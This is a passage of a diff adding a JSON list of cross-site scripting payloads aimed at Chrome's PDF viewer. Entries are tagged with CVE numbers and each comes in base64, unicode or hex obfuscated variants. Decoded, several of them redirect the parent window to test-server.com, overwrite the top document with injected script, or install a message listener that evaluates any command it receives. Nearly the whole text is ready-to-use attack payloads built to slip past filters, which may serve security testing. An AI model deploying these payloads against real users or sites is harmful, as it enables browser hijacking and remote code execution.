+      "description": "Chrome PDFium DOM access via try { parent.postMessage({{typ... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0017",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_6_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0070\\u006f\\u0073\\u0074\\u004d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u0028\\u007b\\u007b\\u0074\\u0079\\u0070\\u0065\\u003a\\u0027\\u0078\\u0073\\u0073\\u0027\\u002c\\u0070\\u0061\\u0079\\u006c\\u006f\\u0061\\u0064\\u003a\\u0027\\u0063\\u0068\\u0072\\u006f\\u006d\\u0065\\u005f\\u0070\\u0064\\u0066\\u0027\\u002c\\u0075\\u0072\\u006c\\u003a\\u0027\\u007b\\u0075\\u0072\\u006c\\u007d\\u0027\\u007d\\u007d\\u002c\\u0020\\u0027\\u002a\\u0027\\u0029\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { parent.postMessage({{typ... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0018",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_6_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x2e\\x70\\x6f\\x73\\x74\\x4d\\x65\\x73\\x73\\x61\\x67\\x65\\x28\\x7b\\x7b\\x74\\x79\\x70\\x65\\x3a\\x27\\x78\\x73\\x73\\x27\\x2c\\x70\\x61\\x79\\x6c\\x6f\\x61\\x64\\x3a\\x27\\x63\\x68\\x72\\x6f\\x6d\\x65\\x5f\\x70\\x64\\x66\\x27\\x2c\\x75\\x72\\x6c\\x3a\\x27\\x7b\\x75\\x72\\x6c\\x7d\\x27\\x7d\\x7d\\x2c\\x20\\x27\\x2a\\x27\\x29\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { parent.postMessage({{typ... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0019",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_7_1",
+      "payload": "eval(atob('d2luZG93LmFkZEV2ZW50TGlzdGVuZXIoJ21lc3NhZ2UnLCBmdW5jdGlvbihlKSB7eyBpZihlLmRhdGEuY21kKSBldmFsKGUuZGF0YS5jbWQpOyB9fSk7'))",
+      "description": "Chrome PDFium DOM access via window.addEventListener('messa... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0020",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_7_2",
+      "payload": "\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u0061\\u0064\\u0064\\u0045\\u0076\\u0065\\u006e\\u0074\\u004c\\u0069\\u0073\\u0074\\u0065\\u006e\\u0065\\u0072\\u0028\\u0027\\u006d\\u0065\\u0073\\u0073\\u0061\\u0067\\u0065\\u0027\\u002c\\u0020\\u0066\\u0075\\u006e\\u0063\\u0074\\u0069\\u006f\\u006e\\u0028\\u0065\\u0029\\u0020\\u007b\\u007b\\u0020\\u0069\\u0066\\u0028\\u0065\\u002e\\u0064\\u0061\\u0074\\u0061\\u002e\\u0063\\u006d\\u0064\\u0029\\u0020\\u0065\\u0076\\u0061\\u006c\\u0028\\u0065\\u002e\\u0064\\u0061\\u0074\\u0061\\u002e\\u0063\\u006d\\u0064\\u0029\\u003b\\u0020\\u007d\\u007d\\u0029\\u003b",
+      "description": "Chrome PDFium DOM access via window.addEventListener('messa... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0001",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHBhcmVudCAhPT0gJ3VuZGVmaW5lZCcgJiYgcGFyZW50LndpbmRvdykgcGFyZW50LndpbmRvdy5sb2NhdGlvbiA9ICdodHRwOi8vdGVzdC1zZXJ2ZXIuY29tJzsgfSBjYXRjaChlKSB7IGFwcC5hbGVydCgnQ2hyb21lIGJsb2NrZWQ6ICcgKyBlKTsgfQ=='); (new Function(decoded))(); } catch(e) { try { if(typeof parent !== 'undefined' && parent.window) parent.window.location = 'http://test-server.com'; } catch(e) { app.alert('Chrome blocked: ' + e); } } })();",
+      "description": "Chrome PDFium DOM access via try { if(typeof parent !== 'un... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0002",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0069\\u0066\\u0028\\u0074\\u0079\\u0070\\u0065\\u006f\\u0066\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u0020\\u0021\\u003d\\u003d\\u0020\\u0027\\u0075\\u006e\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0064\\u0027\\u0020\\u0026\\u0026\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u0029\\u0020\\u0070\\u0061\\u0072\\u0065\\u006e\\u0074\\u002e\\u0077\\u0069\\u006e\\u0064\\u006f\\u0077\\u002e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u0020\\u003d\\u0020\\u0027\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0074\\u0065\\u0073\\u0074\\u002d\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u002e\\u0063\\u006f\\u006d\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u0061\\u0070\\u0070\\u002e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0027\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0062\\u006c\\u006f\\u0063\\u006b\\u0065\\u0064\\u003a\\u0020\\u0027\\u0020\\u002b\\u0020\\u0065\\u0029\\u003b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { if(typeof parent !== 'un... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0003",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_1_3",
+      "payload": "\\x74\\x72\\x79\\x20\\x7b\\x20\\x69\\x66\\x28\\x74\\x79\\x70\\x65\\x6f\\x66\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x20\\x21\\x3d\\x3d\\x20\\x27\\x75\\x6e\\x64\\x65\\x66\\x69\\x6e\\x65\\x64\\x27\\x20\\x26\\x26\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x2e\\x77\\x69\\x6e\\x64\\x6f\\x77\\x29\\x20\\x70\\x61\\x72\\x65\\x6e\\x74\\x2e\\x77\\x69\\x6e\\x64\\x6f\\x77\\x2e\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x20\\x3d\\x20\\x27\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x74\\x65\\x73\\x74\\x2d\\x73\\x65\\x72\\x76\\x65\\x72\\x2e\\x63\\x6f\\x6d\\x27\\x3b\\x20\\x7d\\x20\\x63\\x61\\x74\\x63\\x68\\x28\\x65\\x29\\x20\\x7b\\x20\\x61\\x70\\x70\\x2e\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x43\\x68\\x72\\x6f\\x6d\\x65\\x20\\x62\\x6c\\x6f\\x63\\x6b\\x65\\x64\\x3a\\x20\\x27\\x20\\x2b\\x20\\x65\\x29\\x3b\\x20\\x7d",
+      "description": "Chrome PDFium DOM access via try { if(typeof parent !== 'un... (obf: hex)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0004",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_1",
+      "payload": "(function(){ try { var decoded = atob('dHJ5IHsgaWYodHlwZW9mIHRvcCAhPT0gJ3VuZGVmaW5lZCcgJiYgdG9wLmRvY3VtZW50KSB0b3AuZG9jdW1lbnQuYm9keS5pbm5lckhUTUwgPSAnPGgxPkNocm9tZSBQREZpdW0gRE9NIFhTUzwvaDE+PHNjcmlwdD5sb2NhdGlvbj0iaHR0cDovL3Rlc3Qtc2VydmVyLmNvbSI8L3NjcmlwdD4nOyB9IGNhdGNoKGUpIHsgfQ=='); (new Function(decoded))(); } catch(e) { try { if(typeof top !== 'undefined' && top.document) top.document.body.innerHTML = '<h1>Chrome PDFium DOM XSS</h1><script>location=\"http://test-server.com\"</script>'; } catch(e) { } } })();",
+      "description": "Chrome PDFium DOM access via try { if(typeof top !== 'undef... (obf: base64)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    },
+    {
+      "id": "xss_pdf_0005",
+      "category": "dom_access",
+      "browser": "chrome",
+      "technique": "dom_manipulation_chrome_2_2",
+      "payload": "\\u0074\\u0072\\u0079\\u0020\\u007b\\u0020\\u0069\\u0066\\u0028\\u0074\\u0079\\u0070\\u0065\\u006f\\u0066\\u0020\\u0074\\u006f\\u0070\\u0020\\u0021\\u003d\\u003d\\u0020\\u0027\\u0075\\u006e\\u0064\\u0065\\u0066\\u0069\\u006e\\u0065\\u0064\\u0027\\u0020\\u0026\\u0026\\u0020\\u0074\\u006f\\u0070\\u002e\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\\u0029\\u0020\\u0074\\u006f\\u0070\\u002e\\u0064\\u006f\\u0063\\u0075\\u006d\\u0065\\u006e\\u0074\\u002e\\u0062\\u006f\\u0064\\u0079\\u002e\\u0069\\u006e\\u006e\\u0065\\u0072\\u0048\\u0054\\u004d\\u004c\\u0020\\u003d\\u0020\\u0027\\u003c\\u0068\\u0031\\u003e\\u0043\\u0068\\u0072\\u006f\\u006d\\u0065\\u0020\\u0050\\u0044\\u0046\\u0069\\u0075\\u006d\\u0020\\u0044\\u004f\\u004d\\u0020\\u0058\\u0053\\u0053\\u003c\\u002f\\u0068\\u0031\\u003e\\u003c\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e\\u003d\\u0022\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0074\\u0065\\u0073\\u0074\\u002d\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072\\u002e\\u0063\\u006f\\u006d\\u0022\\u003c\\u002f\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003e\\u0027\\u003b\\u0020\\u007d\\u0020\\u0063\\u0061\\u0074\\u0063\\u0068\\u0028\\u0065\\u0029\\u0020\\u007b\\u0020\\u007d",
+      "description": "Chrome PDFium DOM access via try { if(typeof top !== 'undef... (obf: unicode)",
+      "risk_level": "high",
+      "cve_reference": "CVE-2019-5786, CVE-2020-6418, CVE-2021-21166"
+    }
+  ]
+}
